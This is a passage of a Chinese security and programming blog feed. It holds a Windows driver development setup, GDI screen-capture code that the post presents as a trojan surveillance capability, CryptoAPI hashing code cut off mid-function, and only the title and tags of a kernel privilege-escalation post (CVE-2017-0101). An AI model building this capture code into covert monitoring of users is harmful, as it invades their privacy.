        &lt;h2 id=&quot;ms17-017提权漏洞&quot;&gt;&lt;a href=&quot;#ms17-017提权漏洞&quot; class=&quot;headerlink&quot; title=&quot;ms17-017提权漏洞&quot;&gt;&lt;/a&gt;ms17-017提权漏洞&lt;/h2&gt;&lt;h3 id=&quot;Microsoft-Windows-Transac
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="ms17-017" scheme="http://yeanhoo.gitee.io/tags/ms17-017/"/>
    
      <category term="内核提权漏洞" scheme="http://yeanhoo.gitee.io/tags/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="CVE-2017-0101" scheme="http://yeanhoo.gitee.io/tags/CVE-2017-0101/"/>
    
  </entry>
  
  <entry>
    <title>windows7+VS2010+WDK7.6</title>
    <link href="http://yeanhoo.gitee.io/2020/10/09/windows7+VS2010+WDK7.6/"/>
    <id>http://yeanhoo.gitee.io/2020/10/09/windows7+VS2010+WDK7.6/</id>
    <published>2020-10-09T01:23:52.960Z</published>
    <updated>2020-10-10T16:21:33.248Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows7-VS2010-WDK7-6"><a href="#windows7-VS2010-WDK7-6" class="headerlink" title="windows7+VS2010+WDK7.6"></a>windows7+VS2010+WDK7.6</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>下载安装<a href="https://download.microsoft.com/download/4/A/2/4A25C7D5-EFBE-4182-B6A9-AE6850409A78/GRMWDK_EN_7600_1.ISO" target="_blank" rel="noopener">WDK7.6.1</a></p><p>VS2010配置如下：</p><blockquote><p>配置属性–&gt;常规–&gt;目标文件扩展名 = .sys</p><p>配置属性–&gt;常规–&gt;清除时要删除的扩展名 =;* .sys</p><p>配置属性–&gt;VC++ 目录-&gt;可执行文件目录 = C:\WinDDK\7600.16385.1\bin\x86;$(ExecutablePath)</p><p>配置属性–&gt;VC++ 目录-&gt;包含目录 = C:\WinDDK\7600.16385.1\inc\crt;C:\WinDDK\7600.16385.1\inc\ddk;C:\WinDDK\7600.16385.1\inc\api;$(IncludePath)</p><p>配置属性–&gt;VC++ 目录-&gt;库目录 = C:\WinDDK\7600.16385.1\lib\win7\i386;$(LibraryPath)</p><p>配置属性–&gt;C/C++-&gt;常规-&gt;警告等级 = LEVEL4(/W4)</p><p>配置属性–&gt;C/C++-&gt;预处理器-&gt;预处理器定义 = WIN32=100;<em>X86</em>=1;WINVER=0X501;DBG=1</p><p>配置属性–&gt;C/C++-&gt;高级-&gt;调用约定 = _stdcall(/Gz) </p><p>配置属性–&gt;链接器-&gt;常规-&gt;启用增量连接 = 否（/INCREMENTAL:NO）</p><p>配置属性–&gt;链接器-&gt;输入-&gt;附加依赖项 = ntoskrnl.lib;Hal.lib;wdm.lib;wdmsec.lib;wmilib.lib;ndis.lib;MSVCRT.LIB;LIBCMT.LIB</p><p>配置属性–&gt;链接器-&gt;输入-&gt;忽略所有默认库 = 是（/NODEFAULTLIB）</p><p>配置属性–&gt;链接器-&gt;清单文件-&gt;启用用户账户控制(UAC) = 否(/MANIFESTUAC:NO)</p><p>配置属性–&gt;链接器-&gt;系统-&gt;子系统 = 控制台(/SUBSYSTEM:CONSOLE)</p><p>配置属性–&gt;链接器-&gt;高级-&gt;入口点 = DriverEntry</p><p>配置属性–&gt;链接器-&gt;高级-&gt;基址 = 0x10000</p><p>配置属性–&gt;链接器-&gt;高级-&gt;随机基址 = 删除值</p><p>配置属性–&gt;链接器-&gt;高级-&gt;数据执行保护(DEP) = 删除值</p></blockquote><h3 id="测试驱动"><a href="#测试驱动" class="headerlink" title="测试驱动"></a>测试驱动</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"ntddk.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">UnLoadDriver</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">KdPrint((<span class="string">"DriverRun_yeanhoo"</span>));</span><br><span class="line">DriverObject-&gt;DriverUnload = UnLoadDriver;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">UnLoadDriver</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">KdPrint((<span class="string">"UnloadDriver_yeanhoo!"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Win+R</strong>编辑<strong>gpedit.msc</strong>组策略、关闭驱动数字签名校验</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/windriver.png" alt></p><p>使用<strong>InstDrv</strong>加载驱动</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/windriver2.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;windows7-VS2010-WDK7-6&quot;&gt;&lt;a href=&quot;#windows7-VS2010-WDK7-6&quot; class=&quot;headerlink&quot; title=&quot;windows7+VS2010+WDK7.6&quot;&gt;&lt;/a&gt;windows7+VS2010+WDK7
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="windows driver" scheme="http://yeanhoo.gitee.io/tags/windows-driver/"/>
    
      <category term="驱动" scheme="http://yeanhoo.gitee.io/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>桌面截屏</title>
    <link href="http://yeanhoo.gitee.io/2020/10/08/%E6%A1%8C%E9%9D%A2%E6%88%AA%E5%B1%8F/"/>
    <id>http://yeanhoo.gitee.io/2020/10/08/%E6%A1%8C%E9%9D%A2%E6%88%AA%E5%B1%8F/</id>
    <published>2020-10-08T15:22:31.774Z</published>
    <updated>2020-10-08T15:22:01.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="桌面截屏"><a href="#桌面截屏" class="headerlink" title="桌面截屏"></a>桌面截屏</h2><p>​    对用户计算机进行截屏，获取截屏数据，能够让病毒木马的控制者直接观看到用户计算机的画面，直 观地了解到目前计算机的操作和状态，便于监控用户计算机的屏幕。如果截屏频率足够快，甚至可以连成 一段视频。<br>在用户层上，通常通过GDI（Graphics Device Interface）方式实现屏幕画面抓取。GDI图形库提供了一 系列绘图接口函数，这极大地简化了绘图操作。GDI虽然是常用的绘图方式，但是压缩算法太差，压缩大 图失真严重，并且只支持BMP图片类型。</p><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;atlimage.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">ScreenCapture</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">PaintMouse</span><span class="params">(HDC hdc)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">SaveBmp</span><span class="params">(HBITMAP bmp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ScreenCapture();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ScreenCapture</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hDesktopWnd = GetDesktopWindow();</span><br><span class="line"><span class="comment">//获取桌面窗口句柄</span></span><br><span class="line">HDC hdc = GetDC(hDesktopWnd);</span><br><span class="line"><span class="comment">//获取窗口DC</span></span><br><span class="line"></span><br><span class="line">HDC mdc = CreateCompatibleDC(hdc);</span><br><span class="line"><span class="comment">//创建兼容DC屏幕设备上下文</span></span><br><span class="line"></span><br><span class="line">DWORD dwScreenWidth = GetSystemMetrics(SM_CXSCREEN);</span><br><span class="line">DWORD dwScreenHeight = GetSystemMetrics(SM_CYSCREEN);</span><br><span class="line"><span class="comment">//获取屏幕尺寸</span></span><br><span class="line"></span><br><span class="line">HBITMAP bmp = CreateCompatibleBitmap(hdc,dwScreenWidth,dwScreenHeight);</span><br><span class="line"><span class="comment">//创建兼容位图</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HBITMAP holdbmp = (HBITMAP)SelectObject(mdc,bmp);</span><br><span class="line">BitBlt(mdc,<span class="number">0</span>,<span class="number">0</span>,dwScreenWidth,dwScreenHeight,hdc,<span class="number">0</span>,<span class="number">0</span>,SRCCOPY);</span><br><span class="line"></span><br><span class="line">PaintMouse(mdc);</span><br><span class="line"><span class="comment">//绘制鼠标</span></span><br><span class="line">SaveBmp(bmp);</span><br><span class="line"><span class="comment">//保存图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">PaintMouse</span><span class="params">(HDC hdc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CURSORINFO cursorInfo = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ICONINFO iconInfo = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">HBITMAP bmpOldMask = <span class="literal">NULL</span>;</span><br><span class="line">HDC bufdc = CreateCompatibleDC(hdc);</span><br><span class="line">RtlZeroMemory(&amp;iconInfo,<span class="keyword">sizeof</span>(iconInfo));</span><br><span class="line">cursorInfo.cbSize = <span class="keyword">sizeof</span>(cursorInfo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GetCursorInfo(&amp;cursorInfo);</span><br><span class="line"><span class="comment">//获取光标信息</span></span><br><span class="line">GetIconInfo(cursorInfo.hCursor,&amp;iconInfo);</span><br><span class="line"><span class="comment">//获取光标图标信息</span></span><br><span class="line"></span><br><span class="line">bmpOldMask = (HBITMAP)SelectObject(bufdc,iconInfo.hbmMask);</span><br><span class="line">BitBlt(hdc,cursorInfo.ptScreenPos.x,cursorInfo.ptScreenPos.y,<span class="number">20</span>,<span class="number">20</span>,bufdc,<span class="number">0</span>,<span class="number">0</span>,SRCAND);</span><br><span class="line"><span class="comment">//显示掩图</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SelectObject(bufdc,iconInfo.hbmColor);</span><br><span class="line">BitBlt(hdc,cursorInfo.ptScreenPos.x,cursorInfo.ptScreenPos.y,<span class="number">20</span>,<span class="number">20</span>,bufdc,<span class="number">0</span>,<span class="number">0</span>,SRCPAINT);</span><br><span class="line"><span class="comment">//显示彩图</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SelectObject(bufdc,bmpOldMask);</span><br><span class="line">DeleteObject(iconInfo.hbmColor);</span><br><span class="line">DeleteObject(iconInfo.hbmMask);</span><br><span class="line">DeleteDC(bufdc);</span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SaveBmp</span><span class="params">(HBITMAP bmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CImage <span class="built_in">image</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>.Attach(bmp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>.Save(<span class="string">"screenCapture.jpg"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ScreenCapture.gif" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;桌面截屏&quot;&gt;&lt;a href=&quot;#桌面截屏&quot; class=&quot;headerlink&quot; title=&quot;桌面截屏&quot;&gt;&lt;/a&gt;桌面截屏&lt;/h2&gt;&lt;p&gt;​    对用户计算机进行截屏，获取截屏数据，能够让病毒木马的控制者直接观看到用户计算机的画面，直 观地了解到目前计算机的操
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="桌面截屏" scheme="http://yeanhoo.gitee.io/tags/%E6%A1%8C%E9%9D%A2%E6%88%AA%E5%B1%8F/"/>
    
      <category term="截屏工具" scheme="http://yeanhoo.gitee.io/tags/%E6%88%AA%E5%B1%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>HASH计算  &amp;  AES算法调用</title>
    <link href="http://yeanhoo.gitee.io/2020/10/08/HASH%E8%AE%A1%E7%AE%97%20%20&amp;%20%20AES%E7%AE%97%E6%B3%95%E8%B0%83%E7%94%A8/"/>
    <id>http://yeanhoo.gitee.io/2020/10/08/HASH%E8%AE%A1%E7%AE%97%20%20&amp;%20%20AES%E7%AE%97%E6%B3%95%E8%B0%83%E7%94%A8/</id>
    <published>2020-10-08T15:22:31.732Z</published>
    <updated>2020-10-08T15:22:20.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HASH计算-amp-AES算法调用"><a href="#HASH计算-amp-AES算法调用" class="headerlink" title="HASH计算  &amp;  AES算法调用"></a>HASH计算  &amp;  AES算法调用</h2><p>HASH就是把任意长度的输入通过HASH算法变换成固定长度的输出，该输出就是HASH值。HASH值的空间通常远小于输入值的空间，不同的输入可能会得到相同的输出，所以不可能利用HASH值来确定唯 一的输入值。基于这种特性，HASH值常用来执行数据完整性校验。</p><ul><li>获取CSP的密钥容器句柄</li><li>创建HASH对象、指定算法</li><li>计算HASH</li><li>从HASH对象查询HASH信息</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetFileData</span><span class="params">(<span class="keyword">char</span> *pszFilePath, BYTE **ppFileData, DWORD *pdwFileDataLength)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CalculateHash</span><span class="params">(BYTE *pData, DWORD dwDataLength, ALG_ID algHashType, BYTE **ppHashData, DWORD *pdwHashDataLength)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE *pData = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwDataLength = <span class="number">0</span>;</span><br><span class="line">DWORD i = <span class="number">0</span>;</span><br><span class="line">BYTE *pHashData = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwHashDataLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件数据</span></span><br><span class="line">GetFileData(<span class="string">"C:\\users\\john\\desktop\\calc.exe"</span>, &amp;pData, &amp;dwDataLength);</span><br><span class="line"></span><br><span class="line"><span class="comment">// MD5</span></span><br><span class="line">CalculateHash(pData, dwDataLength, CALG_MD5, &amp;pHashData, &amp;dwHashDataLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"MD5[%d]\n"</span>, dwHashDataLength);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwHashDataLength; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, pHashData[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>, dwHashDataLength);</span><br><span class="line"><span class="keyword">if</span> (pHashData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pHashData;</span><br><span class="line">pHashData = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SHA1</span></span><br><span class="line">CalculateHash(pData, dwDataLength, CALG_SHA1, &amp;pHashData, &amp;dwHashDataLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SHA1[%d]\n"</span>, dwHashDataLength);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwHashDataLength; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, pHashData[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>, dwHashDataLength);</span><br><span class="line"><span class="keyword">if</span> (pHashData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pHashData;</span><br><span class="line">pHashData = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SHA256</span></span><br><span class="line">CalculateHash(pData, dwDataLength, CALG_SHA_256, &amp;pHashData, &amp;dwHashDataLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SHA256[%d]\n"</span>, dwHashDataLength);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwHashDataLength; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, pHashData[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>, dwHashDataLength);</span><br><span class="line"><span class="keyword">if</span> (pHashData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pHashData;</span><br><span class="line">pHashData = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">GetFileData</span><span class="params">(<span class="keyword">char</span> *pszFilePath, BYTE **ppFileData, DWORD *pdwFileDataLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL bRet = TRUE;</span><br><span class="line">BYTE *pFileData = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwFileDataLength = <span class="number">0</span>;</span><br><span class="line">HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwTemp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hFile = CreateFile(pszFilePath, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_ARCHIVE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dwFileDataLength = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">pFileData = <span class="keyword">new</span> BYTE[dwFileDataLength];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pFileData)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line">RtlZeroMemory(pFileData, dwFileDataLength);</span><br><span class="line">ReadFile(hFile, pFileData, dwFileDataLength, &amp;dwTemp, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回</span></span><br><span class="line">*ppFileData = pFileData;</span><br><span class="line">*pdwFileDataLength = dwFileDataLength;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hFile)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CalculateHash</span><span class="params">(BYTE *pData, DWORD dwDataLength, ALG_ID algHashType, BYTE **ppHashData, DWORD *pdwHashDataLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HCRYPTPROV hCryptProv = <span class="literal">NULL</span>;</span><br><span class="line">HCRYPTHASH hCryptHash = <span class="literal">NULL</span>;</span><br><span class="line">BYTE *pHashData = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwHashDataLength = <span class="number">0</span>;</span><br><span class="line">DWORD dwTemp = <span class="number">0</span>;</span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得默认CSP的密钥容器的句柄</span></span><br><span class="line">bRet = CryptAcquireContext(&amp;hCryptProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);<span class="comment">//PROV_RSA_AES 支持RSA、AES、HASH</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个HASH对象, 指定HASH算法</span></span><br><span class="line">bRet = CryptCreateHash(hCryptProv, algHashType, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;hCryptHash);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算HASH数据</span></span><br><span class="line">bRet = CryptHashData(hCryptHash, pData, dwDataLength, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取HASH结果的大小</span></span><br><span class="line">dwTemp = <span class="keyword">sizeof</span>(dwHashDataLength);</span><br><span class="line">bRet = CryptGetHashParam(hCryptHash, HP_HASHSIZE, (BYTE *)(&amp;dwHashDataLength), &amp;dwTemp, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line">bRet = FALSE;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">pHashData = <span class="keyword">new</span> BYTE[dwHashDataLength];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == 